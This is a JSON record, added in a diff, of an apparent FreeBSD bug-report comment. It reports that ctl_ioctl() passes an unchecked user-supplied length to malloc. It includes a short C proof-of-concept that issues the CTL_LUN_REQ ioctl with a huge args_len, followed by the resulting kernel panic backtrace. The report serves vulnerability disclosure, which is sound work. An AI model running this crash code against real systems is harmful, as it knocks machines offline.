@@ -1,0 +1,8 @@
+{
+ "id": 1224845,
+ "bug_id": 266136,
+ "attachment_id": 0,
+ "creation_time": "2022-08-31T16:29:41Z",
+ "creator": "rtm@lcs.mit.edu",
+ "text": "ctl_ioctl() in cam/ctl/ctl.c says, under CTL_LUN_REQ:\n\n                if (lun_req-\u003eargs != NULL) {\n                        packed = malloc(lun_req-\u003eargs_len, M_CTL, M_WAITOK);\n\nlun_req-\u003eargs_len is supplied by the user program, with no sanity check.\nSome values will crash the kernel, e.g. 0xffffffffffffffff.\n\nA demo:\n\nint main() {\n  int fd = open(\"/dev/cam/ctl\", 2);\n  if(fd \u003c 0) { perror(\"/dev/cam/ctl\"); exit(1); }\n  char buf[512];\n  memset(buf, 0, sizeof(buf));\n  strcpy(buf, \"block\");\n  *(unsigned long long *)(buf + 32 + 14*8) = 0x8000000000000000ull; // args\n  *(unsigned long long *)(buf + 32 + 16*8) = 0xffffffffffffffffull; // args_len\n  ioctl(fd, 0xc168e121, buf); // CTL_LUN_REQ\n}\n\npanic: Assertion size \u003e 0 failed at /usr/rtm/symbsd/src/sys/kern/subr_vmem.c:1332\npanic() at panic+0x2a\nvmem_alloc() at vmem_alloc+0xc8\nkmem_malloc_domain() at kmem_malloc_domain+0x54\nkmem_malloc_domainset() at kmem_malloc_domainset+0x36\nmalloc_large() at malloc_large+0x2a\nmalloc() at malloc+0xf8\nctl_ioctl() at ctl_ioctl+0x958\ndevfs_ioctl() at devfs_ioctl+0xbe\nVOP_IOCTL_APV() at VOP_IOCTL_APV+0x30\nVOP_IOCTL() at VOP_IOCTL+0x36\nvn_ioctl() at vn_ioctl+0xba\ndevfs_ioctl_f() at devfs_ioctl_f+0x20\nfo_ioctl() at fo_ioctl+0xa\nkern_ioctl() at kern_ioctl+0x242\nsys_ioctl() at sys_ioctl+0x120\nsyscallenter() at syscallenter+0xec\necall_handler() at ecall_handler+0x18\ndo_trap_user() at do_trap_user+0xea\ncpu_exception_handler_user() at cpu_exception_handler_user+0x72"
+}
